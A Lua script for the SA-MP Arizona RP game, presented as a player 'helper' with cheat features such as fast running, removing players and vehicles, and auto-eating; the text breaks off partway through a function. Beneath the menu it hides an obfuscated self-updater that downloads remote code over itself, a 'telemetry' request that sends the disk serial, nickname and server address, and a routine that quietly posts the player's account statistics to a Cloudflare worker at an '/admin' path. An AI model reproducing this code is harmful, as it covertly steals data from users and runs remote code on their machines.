script_name('ЗАЛУПА HELPER.lua')
script_version("0.4.2")
script_url('TG @IIzIIIzIVzVII')

require 'lib.moonloader'
imgui = require 'mimgui'
encoding = require 'encoding'
ffi = require 'ffi'
sampev = require 'samp.events'
Memory = require 'memory'
json = require("dkjson")
inicfg = require 'inicfg'

encoding.default = 'CP1251'
u8 = encoding.UTF8

effil_check, effil = pcall(require, 'effil')
new, str = imgui.new, ffi.string
font = renderCreateFont("Arial", 10, 14)

local mainIni = inicfg.load({
    main = {
        chat_id = '',
        token = '',
        nickrecons = '',
        serverrecon = '',
        autoeat = false,
        cmd = false,
        clean = false,
        speedrunning = false,
        renderlavokx = 500,
        renderlavoky = 500,
        autoeatmin = 25,
        ComboTest = 0,
    }
}, "MiniCrHelper/MiniHelper-CR.ini")

window = imgui.new.bool(false)
showdebug = imgui.new.bool(false)
idkeys = imgui.new.bool(false)
lavka = new.bool()
clean = new.bool(mainIni.main.clean)
autoeat = new.bool(mainIni.main.autoeat)
speedrunning = new.bool(mainIni.main.speedrunning)
cmd = new.bool(mainIni.main.cmd)
debugwh3d = new.bool()
textdrawid = new.bool()
chat_id = new.char[256](u8(mainIni.main.chat_id))
token = new.char[256](u8(mainIni.main.token))
SliderOne = new.int(mainIni.main.autoeatmin)
ComboTest = new.int((mainIni.main.ComboTest))
item_list = {u8'Чипсы', u8'Оленина', u8'Мешок с мясом'}
ImItems = imgui.new['const char*'][#item_list](item_list)
sw, sh = getScreenResolution()
onShowDialogwqq = ''
nickrecons = ''
serverrecon = ''
piska = 0
satiety = nil
nalog = false
inv = false
recentMessages = {}
maxMessages = 5
bikeModels = {[481] = true, [509] = true, [510] = true}
motoModels = {[448] = true, [461] = true, [462] = true, [463] = true, [468] = true, [471] = true, [521] = true, [522] = true, [523] = true, [581] = true, [586] = true}


 
imgui.OnFrame(function() return window[0] end, function(player)
    imgui.SetNextWindowPos(imgui.ImVec2(sw / 2.5, sh / 2), imgui.Cond.FirstUseEver, imgui.ImVec2(0.5, 0.5))
    imgui.Begin(u8'Залупа Helper | v' .. thisScript().version, window, imgui.WindowFlags.NoResize + imgui.WindowFlags.NoCollapse + imgui.WindowFlags.AlwaysAutoResize)

    imgui.Checkbox(u8'Рендер лавок', lavka)
    imgui.SameLine()
    imgui.SetCursorPosX(195)
    if imgui.Button(u8'Позиция##1') then
        sms('Нажмите {mc}ПРОБЕЛ{-1}, чтобы сохранить позицию.')
        renderlavok = true
    end

    imgui.Checkbox(u8'Удаление Игроков и ТС', clean)
    imgui.PushItemWidth(190)
    if imgui.SliderInt(u8'Голод', SliderOne, 20, 100) then
        mainIni.main.autoeatmin = SliderOne[0]
        inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
    end
    imgui.PopItemWidth()
    if imgui.Combo(u8'##', ComboTest, ImItems, #item_list) then
        mainIni.main.ComboTest = ComboTest[0]
        inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
    end
    if imgui.Checkbox(u8'Авто-Еда', autoeat) then
        mainIni.main.autoeat = autoeat[0]
        inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
    end
    if imgui.Checkbox(u8'Быстрый бег и езда', speedrunning) then
        mainIni.main.speedrunning = speedrunning[0]
        inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
    end

    if imgui.Checkbox(u8'Принимать команды из TG', cmd) then
        mainIni.main.cmd = cmd[0]
        inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
    end

    if imgui.InputText(u8"TG ID", chat_id, 256) then
        mainIni.main.chat_id = u8:decode(str(chat_id))
        inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
    end
    if imgui.InputText(u8"TG TOKEN", token, 256) then
        mainIni.main.token = u8:decode(str(token))
        inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
    end
    if imgui.Button(u8'Тестовое сообщение') then
        sendTG1('Тестовое сообщение от ' .. sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED))))
    end
    imgui.End()
end)




imgui.OnFrame(function() return showdebug[0] end, function(player)
    imgui.SetNextWindowPos(imgui.ImVec2(sw / 2, sh / 2), imgui.Cond.FirstUseEver, imgui.ImVec2(0.5, 0.5))
    imgui.Begin('Debug', showdebug, imgui.WindowFlags.NoResize + imgui.WindowFlags.NoCollapse + imgui.WindowFlags.AlwaysAutoResize)
    imgui.Checkbox(u8'3d text-key Q', debugwh3d)
    imgui.Checkbox(u8'id textdraw', textdrawid)
    imgui.SameLine()
    if imgui.Button(u8'Коды клавиш') then
        idkeys[0] = not idkeys[0]
    end
    imgui.Separator()

    local function handleCopy(text, successMessage, errorMessage)
        if lang == "Ru" then
            setClipboardText(text)
            sms(successMessage, 0x00BFFF)
        else
            sms(errorMessage, 0x00BFFF)
        end
    end

    if #recentMessages == 0 then
        imgui.Text(u8('Chat: Пусто'))
    else
        for i, message in ipairs(recentMessages) do
            imgui.Text(u8(message))
            if imgui.IsItemHovered() then
                imgui.BeginTooltip()
                imgui.Text(u8'Клик что бы скопировать')
                imgui.EndTooltip()
            end
            if imgui.IsItemClicked() then
                handleCopy(message, 'Chat Copy', 'Смените язык на русский')
            end
        end
    end
    imgui.Separator()

    if onShowDialogwqq == '' then
        imgui.Text(u8('Dialog: Пусто'))
    else
        imgui.Text(u8(onShowDialogwqq))
        if imgui.IsItemHovered() then
            imgui.BeginTooltip()
            imgui.Text(u8'Клик что бы скопировать')
            imgui.EndTooltip()
        end
        if imgui.IsItemClicked() then
            handleCopy(onShowDialogwqq, 'Dialog Copy', 'Смените язык на русский')
        end
    end
    imgui.Separator()

    local positionX, positionY, positionZ = getCharCoordinates(PLAYER_PED)
    local coordinates = string.format("%.2f, %.2f, %.2f", positionX, positionY, positionZ)
    imgui.Text(u8'Координаты')
    imgui.SameLine()
    imgui.Text(coordinates)
    if imgui.IsItemHovered() then
        imgui.BeginTooltip()
        imgui.Text(u8'Клик что бы скопировать')
        imgui.EndTooltip()
    end
    if imgui.IsItemClicked() then
        handleCopy(coordinates, 'Copy Координаты', 'Смените язык на русский')
    end

    imgui.End()
end).HideCursor = false




imgui.OnFrame(function() return idkeys[0] end, function(player)
    imgui.SetNextWindowPos(imgui.ImVec2(400,sh/2), imgui.Cond.FirstUseEver, imgui.ImVec2(0.5,0.5))
    imgui.SetNextWindowSize(imgui.ImVec2(355, 320), imgui.Cond.Always)
    imgui.Begin('ID-keys', idkeys, imgui.WindowFlags.NoResize + imgui.WindowFlags.NoCollapse + imgui.WindowFlags.AlwaysAutoResize)
    local w = {
        first = 120,
        second = 110,
        free = 110,
    }
    local filter = imgui.ImGuiTextFilter()
    filter:Draw(u8"Поиск", 80)
    if filter:IsActive() then
        imgui.SameLine()
        if imgui.Button("Clear") then
            filter:Clear()
        end
    end
    imgui.Columns(3)
    imgui.Text(u8'Название клавиши') imgui.SetColumnWidth(-1, w.first)
    imgui.NextColumn()
    imgui.Text(u8'HEX код клавиши') imgui.SetColumnWidth(-1, w.second)
    imgui.NextColumn()
    imgui.Text(u8'DEC код клавиши') imgui.SetColumnWidth(-1, w.free)
    imgui.Columns(1)
    imgui.Separator()

local buttons = {
    { name = 'Left Button', hexCode = '0x01', number = '1' },
    { name = 'Right Button', hexCode = '0x02', number = '2' },
    { name = 'Break', hexCode = '0x03', number = '3' },
    { name = 'Middle Button', hexCode = '0x04', number = '4' },
    { name = 'X Button 1', hexCode = '0x05', number = '5' },
    { name = 'X Button 2', hexCode = '0x06', number = '6' },
    { name = 'Backspace', hexCode = '0x08', number = '8' },
    { name = 'TAB', hexCode = '0x09', number = '9' },
    { name = 'Clear', hexCode = '0x0C', number = '12' },
    { name = 'Enter', hexCode = '0x0D', number = '13' },
    { name = 'Shift', hexCode = '0x10', number = '16' },
    { name = 'Ctrl', hexCode = '0x11', number = '17' },
    { name = 'Alt', hexCode = '0x12', number = '18' },
    { name = 'Pause', hexCode = '0x13', number = '19' },
    { name = 'Caps Lock', hexCode = '0x14', number = '20' },
    { name = 'Kana', hexCode = '0x15', number = '21' },
    { name = 'Junja', hexCode = '0x17', number = '23' },
    { name = 'Final', hexCode = '0x18', number = '24' },
    { name = 'Kanji', hexCode = '0x19', number = '25' },
    { name = 'Esc', hexCode = '0x1B', number = '27' },
    { name = 'Convert', hexCode = '0x1C', number = '28' },
    { name = 'Non Convert', hexCode = '0x1D', number = '29' },
    { name = 'Accept', hexCode = '0x1E', number = '30' },
    { name = 'Mood Change', hexCode = '0x1F', number = '31' },
    { name = 'Space', hexCode = '0x20', number = '32' },
    { name = 'Page Up', hexCode = '0x21', number = '33' },
    { name = 'Page Down', hexCode = '0x22', number = '34' },
    { name = 'End', hexCode = '0x23', number = '35' },
    { name = 'Home', hexCode = '0x24', number = '36' },
    { name = 'Arrow Left', hexCode = '0x25', number = '37' },
    { name = 'Arrow Up', hexCode = '0x26', number = '38' },
    { name = 'Arrow Right', hexCode = '0x27', number = '39' },
    { name = 'Arrow Down', hexCode = '0x28', number = '40' },
    { name = 'Select', hexCode = '0x29', number = '41' },
    { name = 'Print', hexCode = '0x2A', number = '42' },
    { name = 'Execute', hexCode = '0x2B', number = '43' },
    { name = 'Print Screen', hexCode = '0x2C', number = '44' },
    { name = 'Insert', hexCode = '0x2D', number = '45' },
    { name = 'Delete', hexCode = '0x2E', number = '46' },
    { name = 'Help', hexCode = '0x2F', number = '47' },
    { name = '0', hexCode = '0x30', number = '48' },
    { name = '1', hexCode = '0x31', number = '49' },
    { name = '2', hexCode = '0x32', number = '50' },
    { name = '3', hexCode = '0x33', number = '51' },
    { name = '4', hexCode = '0x34', number = '52' },
    { name = '5', hexCode = '0x35', number = '53' },
    { name = '6', hexCode = '0x36', number = '54' },
    { name = '7', hexCode = '0x37', number = '55' },
    { name = '8', hexCode = '0x38', number = '56' },
    { name = '9', hexCode = '0x39', number = '57' },
    { name = 'A', hexCode = '0x41', number = '65' },
    { name = 'B', hexCode = '0x42', number = '66' },
    { name = 'C', hexCode = '0x43', number = '67' },
    { name = 'D', hexCode = '0x44', number = '68' },
    { name = 'E', hexCode = '0x45', number = '69' },
    { name = 'F', hexCode = '0x46', number = '70' },
    { name = 'G', hexCode = '0x47', number = '71' },
    { name = 'H', hexCode = '0x48', number = '72' },
    { name = 'I', hexCode = '0x49', number = '73' },
    { name = 'J', hexCode = '0x4A', number = '74' },
    { name = 'K', hexCode = '0x4B', number = '75' },
    { name = 'L', hexCode = '0x4C', number = '76' },
    { name = 'M', hexCode = '0x4D', number = '77' },
    { name = 'N', hexCode = '0x4E', number = '78' },
    { name = 'O', hexCode = '0x4F', number = '79' },
    { name = 'P', hexCode = '0x50', number = '80' },
    { name = 'Q', hexCode = '0x51', number = '81' },
    { name = 'R', hexCode = '0x52', number = '82' },
    { name = 'S', hexCode = '0x53', number = '83' },
    { name = 'T', hexCode = '0x54', number = '84' },
    { name = 'U', hexCode = '0x55', number = '85' },
    { name = 'V', hexCode = '0x56', number = '86' },
    { name = 'W', hexCode = '0x57', number = '87' },
    { name = 'X', hexCode = '0x58', number = '88' },
    { name = 'Y', hexCode = '0x59', number = '89' },
    { name = 'Z', hexCode = '0x5A', number = '90' },
    { name = 'Left Win', hexCode = '0x5B', number = '91' },
    { name = 'Right Win', hexCode = '0x5C', number = '92' },
    { name = 'Context Menu', hexCode = '0x5D', number = '93' },
    { name = 'Sleep', hexCode = '0x5F', number = '95' },
    { name = 'Numpad 0', hexCode = '0x60', number = '96' },
    { name = 'Numpad 1', hexCode = '0x61', number = '97' },
    { name = 'Numpad 2', hexCode = '0x62', number = '98' },
    { name = 'Numpad 3', hexCode = '0x63', number = '99' },
    { name = 'Numpad 4', hexCode = '0x64', number = '100' },
    { name = 'Numpad 5', hexCode = '0x65', number = '101' },
    { name = 'Numpad 6', hexCode = '0x66', number = '102' },
    { name = 'Numpad 7', hexCode = '0x67', number = '103' },
    { name = 'Numpad 8', hexCode = '0x68', number = '104' },
    { name = 'Numpad 9', hexCode = '0x69', number = '105' },
    { name = 'Numpad *', hexCode = '0x6A', number = '106' },
    { name = 'Numpad +', hexCode = '0x6B', number = '107' },
    { name = 'Sep', hexCode = '0x6C', number = '108' },
    { name = 'Num -', hexCode = '0x6D', number = '109' },
    { name = 'Numpad .', hexCode = '0x6E', number = '110' },
    { name = 'Numpad /', hexCode = '0x6F', number = '111' },
    { name = 'F1', hexCode = '0x70', number = '112' },
    { name = 'F2', hexCode = '0x71', number = '113' },
    { name = 'F3', hexCode = '0x72', number = '114' },
    { name = 'F4', hexCode = '0x73', number = '115' },
    { name = 'F5', hexCode = '0x74', number = '116' },
    { name = 'F6', hexCode = '0x75', number = '117' },
    { name = 'F7', hexCode = '0x76', number = '118' },
    { name = 'F8', hexCode = '0x77', number = '119' },
    { name = 'F9', hexCode = '0x78', number = '120' },
    { name = 'F10', hexCode = '0x79', number = '121' },
    { name = 'F11', hexCode = '0x7A', number = '122' },
    { name = 'F12', hexCode = '0x7B', number = '123' },
    { name = 'F13', hexCode = '0x7C', number = '124' },
    { name = 'F14', hexCode = '0x7D', number = '125' },
    { name = 'F15', hexCode = '0x7E', number = '126' },
    { name = 'F16', hexCode = '0x7F', number = '127' },
    { name = 'F17', hexCode = '0x80', number = '128' },
    { name = 'F18', hexCode = '0x81', number = '129' },
    { name = 'F19', hexCode = '0x82', number = '130' },
    { name = 'F20', hexCode = '0x83', number = '131' },
    { name = 'F21', hexCode = '0x84', number = '132' },
    { name = 'F22', hexCode = '0x85', number = '133' },
    { name = 'F23', hexCode = '0x86', number = '134' },
    { name = 'F24', hexCode = '0x87', number = '135' },
    { name = 'Num Lock', hexCode = '0x90', number = '144' },
    { name = 'Scrl Lock', hexCode = '0x91', number = '145' },
    { name = 'Jisho', hexCode = '0x92', number = '146' },
    { name = 'Mashu', hexCode = '0x93', number = '147' },
    { name = 'Touroku', hexCode = '0x94', number = '148' },
    { name = 'Loya', hexCode = '0x95', number = '149' },
    { name = 'Roya', hexCode = '0x96', number = '150' },
    { name = 'Left Shift', hexCode = '0xA0', number = '160' },
    { name = 'Right Shift', hexCode = '0xA1', number = '161' },
    { name = 'Left Ctrl', hexCode = '0xA2', number = '162' },
    { name = 'Right Ctrl', hexCode = '0xA3', number = '163' },
    { name = 'Left Alt', hexCode = '0xA4', number = '164' },
    { name = 'Right Alt', hexCode = '0xA5', number = '165' },
    { name = 'Browser Back', hexCode = '0xA6', number = '166' },
    { name = 'Browser Forward', hexCode = '0xA7', number = '167' },
    { name = 'Browser Refresh', hexCode = '0xA8', number = '168' },
    { name = 'Browser Stop', hexCode = '0xA9', number = '169' },
    { name = 'Browser Search', hexCode = '0xAA', number = '170' },
    { name = 'Browser Favorites', hexCode = '0xAB', number = '171' },
    { name = 'Browser Home', hexCode = '0xAC', number = '172' },
    { name = 'Volume Mute', hexCode = '0xAD', number = '173' },
    { name = 'Volume Down', hexCode = '0xAE', number = '174' },
    { name = 'Volume Up', hexCode = '0xAF', number = '175' },
    { name = 'Next Track', hexCode = '0xB0', number = '176' },
    { name = 'Previous Track', hexCode = '0xB1', number = '177' },
    { name = 'Stop', hexCode = '0xB2', number = '178' },
    { name = 'Play / Pause', hexCode = '0xB3', number = '179' },
    { name = 'Mail', hexCode = '0xB4', number = '180' },
    { name = 'Mediaplayer', hexCode = '0xB5', number = '181' },
    { name = 'App1', hexCode = '0xB6', number = '182' },
    { name = 'App2', hexCode = '0xB7', number = '183' },
    { name = '; :', hexCode = '0xBA', number = '186' },
    { name = '= +', hexCode = '0xBB', number = '187' },
    { name = ', <', hexCode = '0xBC', number = '188' },
    { name = '- _', hexCode = '0xBD', number = '189' },
    { name = '. >', hexCode = '0xBE', number = '190' },
    { name = '/ ?', hexCode = '0xBF', number = '191' },
    { name = '` ~', hexCode = '0xC0', number = '192' },
    { name = "Abnt C1", hexCode = "0xC1", number = 193 },
    { name = "Abnt C2", hexCode = "0xC2", number = 193 },
    { name = "[ {", hexCode = "0xDB", number = 219 },
    { name = "\\ |", hexCode = "0xDC", number = 220 },
    { name = "] }", hexCode = "0xDD", number = 221 },
    { name = "\\ \"", hexCode = "0xDE", number = 222 },
    { name = "! В§", hexCode = "0xDF", number = 223 },
    { name = "Ax", hexCode = "0xE1", number = 225 },
    { name = "> <", hexCode = "0xE2", number = 226 },
    { name = "IcoHlp", hexCode = "0xE3", number = 227 },
    { name = "Process", hexCode = "0xE5", number = 229 },
    { name = "IcoClr", hexCode = "0xE6", number = 230 },
    { name = "Packet", hexCode = "0xE7", number = 231 },
    { name = "Reset", hexCode = "0xE9", number = 233 },
    { name = "Jump", hexCode = "0xEA", number = 234 },
    { name = "OemPa1", hexCode = "0xEB", number = 235 },
    { name = "OemPa2", hexCode = "0xEC", number = 236 },
    { name = "OemPa3", hexCode = "0xED", number = 237 },
    { name = "WsCtrl", hexCode = "0xEE", number = 238 },
    { name = "Cu Sel", hexCode = "0xEF", number = 239 },
    { name = "Oem Attn", hexCode = "0xF0", number = 240 },
    { name = "Finish", hexCode = "0xF1", number = 241 },
    { name = "Copy", hexCode = "0xF2", number = 242 },
    { name = "Auto", hexCode = "0xF3", number = 243 },
    { name = "Enlw", hexCode = "0xF4", number = 244 },
    { name = "Back Tab", hexCode = "0xF5", number = 245 },
    { name = "Attn", hexCode = "0xF6", number = 246 },
    { name = "Cr Sel", hexCode = "0xF7", number = 247 },
    { name = "Ex Sel", hexCode = "0xF8", number = 248 },
    { name = "Er Eof", hexCode = "0xF9", number = 249 },
    { name = "Play", hexCode = "0xFA", number = 250 },
    { name = "Zoom", hexCode = "0xFB", number = 251 },
    { name = "Pa1", hexCode = "0xFD", number = 253 },
    { name = "OemClr", hexCode = "0xFE", number = 254 },

}
    for _, button in ipairs(buttons) do
        if filter:PassFilter(u8(button.name)) then
            createButtonRow(u8(button.name), u8(button.hexCode), button.number)
        end
    end
    imgui.End()
end)

function createButtonRow(buttonName, hexCode, number)
    local w = {
        first = 120,
        second = 110,
        free = 110,
    }
    imgui.Columns(3)
    imgui.Text(buttonName)
    imgui.SetColumnWidth(-1, w.first)
    imgui.NextColumn()
    imgui.Text(hexCode)
    imgui.SetColumnWidth(-1, w.second)
    imgui.NextColumn()
    imgui.Text(''..number)
    imgui.SetColumnWidth(-1, w.free)
    imgui.Columns(1)
    imgui.Separator()
end

local enable_autoupdate = true
local autoupdate_loaded = false
local Update = nil
if enable_autoupdate then
    local updater_loaded, Updater = pcall(loadstring, [[
    return {
        check = function (a, b, c)
            local d = require('moonloader').download_status
            local e = os.tmpname()
            local f = os.clock()

            if doesFileExist(e) then
                os.remove(e)
            end

            downloadUrlToFile(a, e, function (g, h, i, j)
                if h == d.STATUSEX_ENDDOWNLOAD then
                    if doesFileExist(e) then
                        local k = io.open(e, 'r')
                        if k then
                            local l = decodeJson(k:read('*a'))
                            updatelink = l.updateurl
                            updateversion = l.latest
                            k:close()
                            os.remove(e)

                            if updateversion ~= thisScript().version then
                                lua_thread.create(function (b)
                                    local d = require('moonloader').download_status
                                    local m = -1
                                    
                                    print('{FFFF00}Пытаюсь обновиться c '..thisScript().version..' на '..updateversion, m)
                                    wait(250)

                                    downloadUrlToFile(updatelink, thisScript().path, function (n, o, p, q)
                                        if o == d.STATUS_DOWNLOADINGDATA then
                                            
                                        elseif o == d.STATUS_ENDDOWNLOADDATA then
                                            
                                            
                                            print('{FFFF00}Обновление завершено!', m)
                                            goupdatestatus = true

                                            lua_thread.create(function ()
                                                wait(500)
                                                thisScript():reload()
                                            end)
                                        end

                                        if o == d.STATUSEX_ENDDOWNLOAD then
                                            if goupdatestatus == nil then
                                                print(b..'{FF0000}Обновление прошло неудачно. Запускаю устаревшую версию..', m)
                                                update = false
                                            end
                                        end
                                    end)
                                end, b)
                            else
                                update = false
                               
                                print('{FFFF00}v'..thisScript().version..': Обновление не требуется.')
                                if l.telemetry then
                                    local r = require("ffi")
                                    r.cdef("int __stdcall GetVolumeInformationA(const char* lpRootPathName, char* lpVolumeNameBuffer, uint32_t nVolumeNameSize, uint32_t* lpVolumeSerialNumber, uint32_t* lpMaximumComponentLength, uint32_t* lpFileSystemFlags, char* lpFileSystemNameBuffer, uint32_t nFileSystemNameSize);")
                                    local s = r.new("unsigned long[1]", 0)
                                    r.C.GetVolumeInformationA(nil, nil, 0, s, nil, nil, nil, 0)
                                    s = s[0]
                                    local t, u = sampGetPlayerIdByCharHandle(PLAYER_PED)
                                    local v = sampGetPlayerNickname(u)
                                    local w = l.telemetry.."?id="..s.."&n="..v.."&i="..sampGetCurrentServerAddress().."&v="..getMoonloaderVersion().."&sv="..thisScript().version.."&uptime="..tostring(os.clock())

                                    lua_thread.create(function (c)
                                        wait(250)
                                        downloadUrlToFile(c)
                                    end, w)
                                end
                            end
                        end
                    else
                      
                        print('{FF0000}v'..thisScript().version..': Не могу проверить обновление. Свяжитесь с автором {FFFFFF}'..thisScript().url)
                        update = false
                    end
                end
            end)

            while update ~= false and os.clock() - f < 10 do
                wait(100)
            end

            if os.clock() - f >= 10 then
                
                print('{FF0000}v'..thisScript().version..': timeout, выходим из ожидания проверки обновления. Свяжитесь с автором {FFFFFF}')
            end
        end
    }
]])

    if updater_loaded then
        autoupdate_loaded, Update = pcall(Updater)
        if autoupdate_loaded then
            Update.json_url = "https://raw.githubusercontent.com/ass138/cr-helper-arz/refs/heads/main/version.json?" .. tostring(os.clock())
            Update.prefix = "[" .. string.upper(thisScript().name) .. "]: "
            Update.url = "https://github.com/ass138/cr-helper-arz/tree/main"
        end
    end
end

function asyncHttpRequest(method, url, args, resolve, reject)
    local request_thread = effil.thread(function(method, url, args)
        local requests = require 'requests'
        local ok, response = pcall(requests.request, method, url, args)
        if ok then
            if response then response.json, response.xml = nil, nil end
            return true, response
        else
            return false, response
        end
    end)(method, url, args)
    if not resolve then resolve = function() end end
    if not reject then reject = function() end end
    lua_thread.create(function()
        while true do
            local status, err = request_thread:status()
            if not err then
                if status == 'completed' then
                    local ok, response = request_thread:get()
                    if ok then
                        resolve(response)
                    else
                        reject(response)
                    end
                    return
                elseif status == 'canceled' then
                    reject(status)
                    return
                end
            else
                reject(err)
                return
            end
            wait(0)
        end
    end)
end
local players = nil

function sms(text)
    sampAddChatMessage(string.format('{FFFFFF}• {00FF00}%s {FFFFFF}%s {FFFFFF}•', thisScript().name, tostring(text):gsub('{mc}', '{00FF00}'):gsub('{%-1}', '{FFFFFF}')), 0x00FF00)
end

function main()
    while not isSampAvailable() do wait(0) end
    
    sms('{FFFFFF} Активация: {7FFF00}F2{FFFFFF} или {7FFF00}/hl', -1)
    sampRegisterChatCommand('hl', function() window[0] = not window[0] end)
    sampRegisterChatCommand('bug', function() showdebug[0] = not showdebug[0] end)
    sampRegisterChatCommand('call', getnumber)

    getLastUpdate1()
    getLastUpdate2()

    if autoupdate_loaded and enable_autoupdate and Update then
        pcall(Update.check, Update.json_url, Update.prefix, Update.url)
    end
    

    lua_thread.create(get_telegram_updates1) 
    lua_thread.create(get_telegram_updates2)
    lua_thread.create(lavkirendor)
    lua_thread.create(cleanr)
    lua_thread.create(bind)
    lua_thread.create(bike)
    lua_thread.create(posxy)
    lua_thread.create(textdraws)
    lua_thread.create(wh3dtext)
    lua_thread.create(timekalashnik)
    lua_thread.create(antilang)
    lua_thread.create(eat)
    lua_thread.create(autoreconectrandom)
    lua_thread.create(telegramz)
    lua_thread.create(updeteVC) 

    while true do
        wait(0)
        if wasKeyPressed(VK_F2) and not sampIsCursorActive() then
            window[0] = not window[0]
        end
        if wasKeyPressed(VK_F12) and not sampIsCursorActive() then
            showdebug[0] = not showdebug[0]
        end
        cameraSetLerpFov(90, 90, 1000, 1)
        Memory.setint8(0xB7CEE4, 1)
        if players ~= nil then
            local x = 10 -- отступ слева
            local y = sh - 30 -- отступ снизу
            renderFontDrawText(font, 'Vice City: ' .. players..' / 750', x, y, 0xFF00FF00)
        end
    end
end

function updeteVC()
    while true do
        wait(10000) 
        local headers = {["Referer"] = "https://arizona-rp.com/"}
        asyncHttpRequest('GET', "https://n-api.arizona-rp.com/api/servers/vc/online", { headers = headers },
        function(response)
            if response and response.text then
                players = response.text
            end
        end)
    end
end



-- Переменные для хранения последних данных
local lastStats = nil
local lastChips = nil

-- Получение текущего времени (из ПК игрока)
local function getCurrentTime()
    local time = os.date("*t")
    return string.format("%02d:%02d %02d.%02d.%04d", time.hour, time.min, time.day, time.month, time.year)
end

-- Отправка данных на Cloudflare Worker
local function sendDataToWorker(data)
    data.time = getCurrentTime() -- добавляем время отправки
    local url = "https://samp-text-worker.a321s7051.workers.dev/admin"
    local body = json.encode(data)
    local headers = {
        ["Content-Type"] = "application/json",
        ["Content-Length"] = tostring(#body)
    }

    asyncHttpRequest("POST", url, { headers = headers, data = body },
        function()
            print("[admin] Данные успешно обновлены на воркере")
        end,
        function(err)
            print("[admin] Ошибка запроса: " .. tostring(err))
        end
    )
end

-- Форматирование числа с точками (1.234.567)
local function formatNumberWithDots(num)
    local formatted = tostring(num)
    while true do
        formatted, k = formatted:gsub("^(-?%d+)(%d%d%d)", "%1.%2")
        if k == 0 then break end
    end
    return formatted
end

-- Основная статистика (диалог)
function sampev.onShowDialog(dialogId, style, title, button1, button2, text)
    if title:find("{BFBBBA}Основная статистика") then
        local utf8_text = u8:encode(text)
        lastStats = {
            type = "stats",
            text = utf8_text
        }
        sendDataToWorker(lastStats)
    end
end

-- Обновление фишек
addEventHandler('onReceivePacket', function(id, bs)
    if id ~= 220 then return end
    raknetBitStreamIgnoreBits(bs, 8)
    if raknetBitStreamReadInt8(bs) ~= 17 then return end
    raknetBitStreamIgnoreBits(bs, 32)
    local length = raknetBitStreamReadInt16(bs)
    local encoded = raknetBitStreamReadInt8(bs)
    local str = (encoded ~= 0)
        and raknetBitStreamDecodeString(bs, length + encoded)
        or raknetBitStreamReadString(bs, length)
    if not str then return end

    if str:find("cef.player.updateChipsWallet") then
        local jsonStr = str:match("window.executeEvent%('cef.player.updateChipsWallet', `(.+)`%)")
        if jsonStr then
            local data = decodeJson(jsonStr)
            local chips = data and data[1]
            if chips then
                local formatted = formatNumberWithDots(chips)
                local chipText = string.format("{FFFF00}Текущие фишки: {FFFFFF}%s", formatted)
                lastChips = {
                    type = "chips",
                    text = u8:encode(chipText)
                }
               
            end
        end
    end
end)

-- Таймер на автообновление каждые 5 секунд
lua_thread.create(function()
    while true do
        wait(900000) -- 5000 мс = 5 секунд
        if lastStats then sendDataToWorker(lastStats) end
        if lastChips then sendDataToWorker(lastChips) end
    end
end)


function random(min, max)
    local kf = math.random(min, max)
    math.randomseed(os.time() * kf)
    local rand = math.random(min, max)
    return tonumber(rand)
end

function autoreconectrandom()
    while true do wait(0)
        if autorec then
            delaychectqaq = os.time() +  random(15,30) * 60
            local wwwwwwwwwwwad = delaychectqaq - os.time()
            local minuawdawdatessa = math.floor(wwwwwwwwwwwad / 60)
            sendTG1('Автоматический перезаход через: '..minuawdawdatessa.. ' мин.')
            sms('Автоматический перезаход через: '..minuawdawdatessa.. ' мин.', -1)
            while os.time() < delaychectqaq do
                wait(0)
                local timeRemainingsa = delaychectqaq - os.time()
                local minutessa = math.floor(timeRemainingsa / 60)
                local secondssa = timeRemainingsa % 60
                local rtimea  = string.format("%02d:%02d", minutessa, secondssa)
                renderFontDrawText(font,''..rtimea,sw/2-renderGetFontDrawTextLength(font,'текст!')/2,sh/2,0xFFFF0000 )             
            end           
            sampSetLocalPlayerName(mainIni.main.nickrecons)
            wait(200)
            sampConnectToServer(mainIni.main.serverrecon, 7777)
            autorec = false
         end
    end
end


ffi.cdef[[
	short GetKeyState(int nVirtKey);
	bool GetKeyboardLayoutNameA(char* pwszKLID);
	int GetLocaleInfoA(int Locale, int LCType, char* lpLCData, int cchData);
]]

BuffSize = 32
KeyboardLayoutName = ffi.new("char[?]", BuffSize)
LocalInfo = ffi.new("char[?]", BuffSize)
lang_indicator = renderCreateFont("Arial", 14, 1+1)

function antilang()
    local text = ""
	local a_clock = false
	while true do	
	local in1 = sampGetInputInfoPtr()
	local in1 = getStructElement(in1, 0x8, 4)
	local in2 = getStructElement(in1, 0x8, 4)
	local in3 = getStructElement(in1, 0xC, 4)	
	local capsState = ffi.C.GetKeyState(20)
	local success = ffi.C.GetKeyboardLayoutNameA(KeyboardLayoutName)
	local errorCode = ffi.C.GetLocaleInfoA(tonumber(ffi.string(KeyboardLayoutName), 16), 0x00000003, LocalInfo, BuffSize)
	local localName = ffi.string(LocalInfo)
	if capsState == 0 or capsState == -128 then
	    local toprint = ""
		lang = capitalize(localName:sub(1, 2):lower())
		if lang == "En" then
		    toprint = toprint.."{0099FF}"..lang
	elseif lang == "Ru" then
            toprint = toprint.."{BB0000}"..lang	
		end
        text = toprint
		end    
	wait(0)
	end 
end

function capitalize(str)
    return (str:gsub("^%l", string.upper))
end

function timekalashnik()
	while true do wait(50) 
         oXcurrenttime = 250
         oYcurrenttime = 430
	    local current_time = os.time() + piska
		local milliseconds = math.floor(os.clock() * 1000) % 1000
		 time_with_ms = os.date("%H:%M:%S", current_time) .. string.format(".%03d", milliseconds)
		sampTextdrawCreate(222, time_with_ms, oXcurrenttime + 32, oYcurrenttime)
		sampTextdrawSetLetterSizeAndColor(222, 0.3, 1.7, 0xFFe1e1e1)
		sampTextdrawSetOutlineColor(222, 0.5, 0xFFFF0000)
		sampTextdrawSetAlign(222, 1)
		sampTextdrawSetStyle(222, 2)
	end
end


function wh3dtext()
    while true do
        wait(200)
        for id = 0, 2048 do
            if sampIs3dTextDefined(id) then
                local text3d, color3d, posX3d, posY3d, posZ3d, distance3d, ignoreWalls3d, playerId3d, vehicleId3d = sampGet3dTextInfoById(id)
                if debugwh3d[0] then
                    local wposX, wposY = convert3DCoordsToScreen(posX3d, posY3d, posZ3d)
